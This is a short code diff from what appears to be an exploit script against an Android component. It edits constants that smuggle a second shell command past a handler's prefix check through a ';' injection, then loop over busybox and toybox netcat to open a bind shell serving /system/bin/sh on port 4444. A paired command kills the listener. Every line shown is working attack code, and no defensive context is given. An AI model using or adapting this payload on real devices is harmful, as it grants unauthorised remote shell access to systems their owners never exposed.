@@ -24,12 +24,13 @@ CID = 0x31
 PREFIX = 'foo'          # satisfies the handler's dedup strncmp
 
 SHELL_CMD = (
-    PREFIX + ';(for b in /system/xbin/busybox /system/bin/busybox '
-    '/system/bin/toybox; do while [ -x $b ]; do '
-    '$b nc -l -p 4444 -e /system/bin/sh; sleep 1; done; done &)'
+    PREFIX + ';(for b in /system/xbin/busybox /system/bin/busybox; do '
+    '[ -x $b ] && $b nc -ll -p 4444 -e /system/bin/sh; done; '
+    'while [ -x /system/bin/toybox ]; do /system/bin/toybox nc -l -p 4444 '
+    '-e /system/bin/sh; sleep 1; done &)'
 )
 
-STOP_CMD = PREFIX + ";pkill -f 'nc -l -p 4444'"
+STOP_CMD = PREFIX + ";pkill -f 'nc -l'"
 
 
 def build(path):
